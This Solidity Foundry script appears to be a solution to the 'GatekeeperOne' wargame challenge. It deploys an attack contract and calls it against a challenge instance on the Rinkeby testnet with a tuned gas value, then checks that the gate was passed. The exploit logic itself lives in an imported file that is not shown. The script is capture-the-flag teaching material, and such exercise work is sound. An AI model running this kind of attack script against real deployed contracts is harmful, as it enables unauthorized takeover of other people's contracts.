// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { Script } from "forge-std/script.sol";

import { GatekeeperOne } from "src/GatekeeperOne/GatekeeperOne.sol";
import { GatekeeperOneAttack } from "src/GatekeeperOne/GatekeeperOneAttack.sol";

contract GatekeeperOneAttackScript is Script {

    // target contract: https://rinkeby.etherscan.io/address/0x536734cD63fb1E3b318eC09d7e0709737da436C0#internaltx

    function run() public {
        address gatekeeperOneInstance = address(0x536734cD63fb1E3b318eC09d7e0709737da436C0);

        vm.startBroadcast();
            GatekeeperOneAttack attacker = new GatekeeperOneAttack();
            attacker.attack(gatekeeperOneInstance, 24827);
            bool success = GatekeeperOne(gatekeeperOneInstance).entrant() != address(0);
            assert(success);
        vm.stopBroadcast();
    }
}